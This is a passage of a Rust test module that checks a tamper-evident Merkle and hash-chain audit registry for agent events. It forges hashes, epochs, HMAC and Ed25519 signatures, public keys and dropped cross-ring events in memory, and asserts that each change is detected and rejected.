        assert!(registry.verify_arm_chain(arm_id), "Chain restored");

        // Attack Scenario 2: Perturb prev_hash of record 3 (chain continuity break)
        {
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            let original_prev = chain.records[3].prev_hash.clone();
            chain.records[3].prev_hash = "baadf00d".repeat(8);
            drop(chain);
            drop(chain_entry);

            assert!(
                !registry.verify_arm_chain(arm_id),
                "Perturbed prev_hash MUST be rejected"
            );

            // Restore
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[3].prev_hash = original_prev;
        }
        assert!(registry.verify_arm_chain(arm_id), "Chain restored");

        // Attack Scenario 3: Attacker replays/modifies epoch to 999
        {
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[1].epoch = 999;
            drop(chain);
            drop(chain_entry);

            assert!(
                !registry.verify_arm_chain(arm_id),
                "Forged epoch in record MUST be rejected due to BLAKE3 mismatch"
            );

            // Restore
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[1].epoch = 1;
        }
        assert!(registry.verify_arm_chain(arm_id), "Chain restored");

        // Attack Scenario 4: Forged tool call payload
        {
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[4].tool_call_hash = "0".repeat(64);
            drop(chain);
            drop(chain_entry);

            assert!(
                !registry.verify_arm_chain(arm_id),
                "Forged tool_call_hash MUST be rejected"
            );

            // Restore
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[4].tool_call_hash = recs[4].tool_call_hash.clone();
        }
        assert!(registry.verify_arm_chain(arm_id), "Chain restored");

        // Attack Scenario 5: Forged HMAC signature
        {
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[0].hmac_sig = "forged_signature_token".to_string();
            drop(chain);
            drop(chain_entry);

            assert!(
                !registry.verify_arm_chain(arm_id),
                "Forged hmac_sig MUST be rejected"
            );

            // Restore
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.records[0].hmac_sig = recs[0].hmac_sig.clone();
        }
        assert!(registry.verify_arm_chain(arm_id), "Chain restored");

        // Attack Scenario 6: Desynchronized current_head
        {
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            let original_head = chain.current_head.clone();
            chain.current_head = "1".repeat(64);
            drop(chain);
            drop(chain_entry);

            assert!(
                !registry.verify_arm_chain(arm_id),
                "Desynced current_head MUST cause verification failure"
            );

            // Restore
            let chain_entry = registry.arms.get(arm_id).unwrap();
            let mut chain = chain_entry.value().lock().unwrap();
            chain.current_head = original_head;
        }
        assert!(
            registry.verify_arm_chain(arm_id),
            "Chain verified cleanly after restoration"
        );
    }

    #[test]
    fn test_adversarial_autotomy_fracture_proof_and_signature_forgery() {
        let registry = HierarchicalMerkleRegistry::new();
        let arm_id = "arm-sever-target";

        registry.record_arm_event(arm_id, 1, "worker", "exec_tool", "sig_epoch1_1");
        let rec2 = registry.record_arm_event(arm_id, 1, "worker", "exec_tool_2", "sig_epoch1_2");

        // Execute surgical autotomy severance
        let fracture =
            registry.record_arm_fracture(arm_id, 1, 2, "lateral_escape_attempt_detected", None);

        assert_eq!(fracture.arm_id, arm_id);
        assert_eq!(fracture.old_epoch, 1);
        assert_eq!(fracture.new_epoch, 2);
        assert_eq!(fracture.terminal_hash, rec2.hash);
        assert!(fracture.global_root.is_some());

        let anchor = registry
            .get_latest_anchor()
            .expect("Anchor created on fracture");
        assert_eq!(anchor.anchor_seq, fracture.anchor_seq);
        assert!(HierarchicalMerkleRegistry::verify_anchor_signature(&anchor).unwrap());

        // Attack Scenario 1: Forged Ed25519 signature bytes
        let mut tampered_sig_anchor = anchor.clone();
        let mut sig_bytes = hex::decode(&tampered_sig_anchor.ed25519_sig).unwrap();
        sig_bytes[5] ^= 0xFF; // Invert bits
        tampered_sig_anchor.ed25519_sig = hex::encode(sig_bytes);
        assert!(
            HierarchicalMerkleRegistry::verify_anchor_signature(&tampered_sig_anchor).is_err(),
            "Forged Ed25519 signature MUST fail verification"
        );

        // Attack Scenario 2: Forged interior node hash
        let mut tampered_hash_anchor = anchor.clone();
        tampered_hash_anchor.interior_hash = "f".repeat(64);
        assert!(
            HierarchicalMerkleRegistry::verify_anchor_signature(&tampered_hash_anchor).is_err(),
            "Tampered interior hash MUST fail Ed25519 signature check"
        );

        // Attack Scenario 3: Substituted public key
        let other_key = SigningKey::generate(&mut OsRng).verifying_key();
        let mut tampered_pk_anchor = anchor.clone();
        tampered_pk_anchor.public_key = hex::encode(other_key.to_bytes());
        assert!(
            HierarchicalMerkleRegistry::verify_anchor_signature(&tampered_pk_anchor).is_err(),
            "Signature check against wrong public key MUST fail"
        );

        // Attack Scenario 4: Malformed hex strings (truncated or non-hex)
        let mut malformed_anchor = anchor.clone();
        malformed_anchor.ed25519_sig = "invalid_non_hex_sig".to_string();
        assert!(HierarchicalMerkleRegistry::verify_anchor_signature(&malformed_anchor).is_err());

        let mut malformed_pk = anchor.clone();
        malformed_pk.public_key = "1234".to_string(); // Too short
        assert!(HierarchicalMerkleRegistry::verify_anchor_signature(&malformed_pk).is_err());
    }

    #[test]
    fn test_adversarial_cross_ring_blinding_matrix_and_chain_tamper() {
        let registry = HierarchicalMerkleRegistry::new();

        // 1. Matrix: Multiple asymmetric blinding ratios
        // Scenario A: N0 = 10 in Ring 0, N2 = 5 in Ring 2 (5 dropped events)
        for i in 0..10 {
            registry.record_ring_transition(
                ContainmentRingId::Ring0Kernel,
                &format!("evt-a0-{}", i),
                "TRANSITION",
                "k_payload",
                true,
            );
        }
        for i in 0..5 {
            registry.record_ring_transition(
                ContainmentRingId::Ring2PolicyMesh,
                &format!("evt-a2-{}", i),
                "TRANSITION",
                "k_payload",
                true,
            );
        }
        let status_a = registry.verify_cross_ring_continuity();
        assert!(!status_a.intact);
        assert_eq!(status_a.dropped_events, 5);
        assert!(status_a.ring_chains_verified);
        assert!(status_a
            .reason
            .contains("Asymmetric pipeline blinding detected"));

        // Scenario B: Total blinding: 20 more events in Ring 0, 0 in Ring 2
        for i in 0..20 {
            registry.record_ring_transition(
                ContainmentRingId::Ring0Kernel,
                &format!("evt-blind-{}", i),
                "TOTAL_BLIND",
                "k_payload",
                true,
            );
        }
        let status_b = registry.verify_cross_ring_continuity();
        assert!(!status_b.intact);
        assert_eq!(status_b.dropped_events, 25); // 5 previous + 20 new

        // 2. Chain Hash Tampering: Attacker attempts to forge an event in Ring 0
        {
            let r0_arc = registry.rings[0].clone();
            let mut r0 = r0_arc.lock().unwrap();
            let original_r0_hash = r0.records[2].hash.clone();
            r0.records[2].hash = "e".repeat(64);
            drop(r0);

            let tamper_status = registry.verify_cross_ring_continuity();
            assert!(!tamper_status.intact);
            assert!(!tamper_status.ring_chains_verified);
            assert!(
                tamper_status
                    .reason
                    .contains("Tampering detected in ring chain"),
                "Ring chain hash tampering must be explicitly diagnosed: {}",
                tamper_status.reason
            );

            // Restore
            let mut r0 = r0_arc.lock().unwrap();
            r0.records[2].hash = original_r0_hash;
        }

        // 3. Chain Hash Tampering in Ring 2
        {
            let r2_arc = registry.rings[2].clone();
            let mut r2 = r2_arc.lock().unwrap();
            let original_r2_prev = r2.records[1].prev_hash.clone();
            r2.records[1].prev_hash = "c".repeat(64);
            drop(r2);

            let tamper_status_r2 = registry.verify_cross_ring_continuity();
            assert!(!tamper_status_r2.intact);
            assert!(!tamper_status_r2.ring_chains_verified);
            assert!(tamper_status_r2
                .reason
                .contains("Tampering detected in ring chain"));

            // Restore
            let mut r2 = r2_arc.lock().unwrap();
            r2.records[1].prev_hash = original_r2_prev;
        }
    }
}
